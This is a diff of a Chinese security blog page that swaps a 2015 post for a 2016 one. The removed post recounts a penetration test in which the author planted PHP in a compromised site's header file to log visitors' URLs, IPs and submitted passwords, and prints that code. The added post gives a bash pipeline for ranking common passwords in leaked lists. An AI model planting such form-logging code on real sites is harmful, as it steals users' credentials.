@@ -35,16 +35,25 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta name="description" content="密码泄露越来越普遍，使得各类“密码分析”工具越来越多。比如最近很火的Pipal，ruby编写的一款程序，可以分析出密码频率TOP N。但使用中发现效率较低。实际上通过简单的bash命令就可以实现上述的功能：
+cat password.txt | sort | uniq -c | sort -k1,1nr | head -10
+提取password词频TOP10的密码
+time cat pass.t">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP记录URL、表单内容">
-<meta property="og:url" content="http://www.rootat.net/2015/07/16/PHPURLForm/index.html">
+<meta property="og:title" content="高效词频分析">
+<meta property="og:url" content="http://www.rootat.net/2016/03/09/passwdTOPN/index.html">
 <meta property="og:site_name" content="root@Zeroh">
-<meta property="og:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
-<meta property="og:updated_time" content="2016-03-09T07:58:56.722Z">
+<meta property="og:description" content="密码泄露越来越普遍，使得各类“密码分析”工具越来越多。比如最近很火的Pipal，ruby编写的一款程序，可以分析出密码频率TOP N。但使用中发现效率较低。实际上通过简单的bash命令就可以实现上述的功能：
+cat password.txt | sort | uniq -c | sort -k1,1nr | head -10
+提取password词频TOP10的密码
+time cat pass.t">
+<meta property="og:updated_time" content="2016-03-09T08:24:07.117Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP记录URL、表单内容">
-<meta name="twitter:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta name="twitter:title" content="高效词频分析">
+<meta name="twitter:description" content="密码泄露越来越普遍，使得各类“密码分析”工具越来越多。比如最近很火的Pipal，ruby编写的一款程序，可以分析出密码频率TOP N。但使用中发现效率较低。实际上通过简单的bash命令就可以实现上述的功能：
+cat password.txt | sort | uniq -c | sort -k1,1nr | head -10
+提取password词频TOP10的密码
+time cat pass.t">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -54,7 +63,7 @@
   };
 </script>
 
-  <title> PHP记录URL、表单内容 | root@Zeroh </title>
+  <title> 高效词频分析 | root@Zeroh </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -145,7 +154,7 @@
           
           
             
-              PHP记录URL、表单内容
+              高效词频分析
             
           
         </h1>
@@ -154,8 +163,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-07-16T15:52:28+08:00" content="2015-07-16">
-            2015-07-16
+          <time itemprop="dateCreated" datetime="2016-03-09T16:23:33+08:00" content="2016-03-09">
+            2016-03-09
           </time>
         </span>
 
@@ -165,8 +174,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/07/16/PHPURLForm/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/07/16/PHPURLForm/" itemprop="commentsCount"></span>
+            <a href="/2016/03/09/passwdTOPN/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/03/09/passwdTOPN/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -180,19 +189,12 @@
       
 
       
-        <span itemprop="articleBody"><p>某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。<br>通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此时有了URL和密码，就可以获得解密后的文件。</p>
-<pre><code>&lt;?php
-<span class="variable">$URL</span>[<span class="string">'URL'</span>] = <span class="string">"http://"</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].($_SERVER[<span class="string">'QUERY_STRING'</span>] ? <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>] : <span class="string">""</span>); 
-<span class="variable">$ip</span>=$_SERVER[<span class="string">"REMOTE_ADDR"</span>];
-<span class="variable">$pass</span> = $_POST[<span class="string">"passname"</span>];
-<span class="variable">$fp</span> = fopen(<span class="string">'/var/www/log.txt'</span>, <span class="string">'a+b'</span>);
-fwrite(<span class="variable">$fp</span>, var_export(<span class="variable">$URL</span>[<span class="string">'URL'</span>], <span class="literal">true</span>));
-fwrite(<span class="variable">$fp</span>, <span class="variable">$pass</span>);
-fwrite(<span class="variable">$fp</span>, <span class="variable">$ip</span>);
-fwrite(<span class="variable">$fp</span>, <span class="string">"\n"</span>);
-fclose(<span class="variable">$fp</span>);
-?&gt;
-</code></pre></span>
+        <span itemprop="articleBody"><p>密码泄露越来越普遍，使得各类“密码分析”工具越来越多。比如最近很火的Pipal，ruby编写的一款程序，可以分析出密码频率TOP N。但使用中发现效率较低。<br>实际上通过简单的bash命令就可以实现上述的功能：</p>
+<pre><code>cat password.txt |<span class="string"> sort </span>|<span class="string"> uniq -c </span>|<span class="string"> sort -k1,1nr </span>|<span class="string"> head -10</span>
+</code></pre><p>提取password词频TOP10的密码</p>
+<p><code>time cat pass.txt | sort | uniq -c | sort -k1,1nr | head -10 &gt;</code> result.txt<br>保存提取结果并记录所消耗时间</p>
+<p>由于sort是C语言编写，效率远高于Pipal。在数据量较大的词频统计时，差距尤其明显。</p>
+</span>
       
     </div>
 
@@ -203,13 +205,11 @@ fclose(<span class="variable">$fp</span>);
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/13/GPPcpassword/" rel="prev">利用域凭据：解密GPP中的管理员密码</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/05/17/Travel/" rel="next">旅行</a>
+              <a href="/2015/10/09/WideByteXSS/" rel="next">XSS中的宽字节编码问题</a>
             
           </div>
         </div>
@@ -371,9 +371,9 @@ fclose(<span class="variable">$fp</span>);
 
     <script type="text/javascript">
       var disqus_shortname = 'rootat';
-      var disqus_identifier = '2015/07/16/PHPURLForm/';
-      var disqus_title = 'PHP记录URL、表单内容';
-      var disqus_url = 'http://www.rootat.net/2015/07/16/PHPURLForm/';
+      var disqus_identifier = '2016/03/09/passwdTOPN/';
+      var disqus_title = '高效词频分析';
+      var disqus_url = 'http://www.rootat.net/2016/03/09/passwdTOPN/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
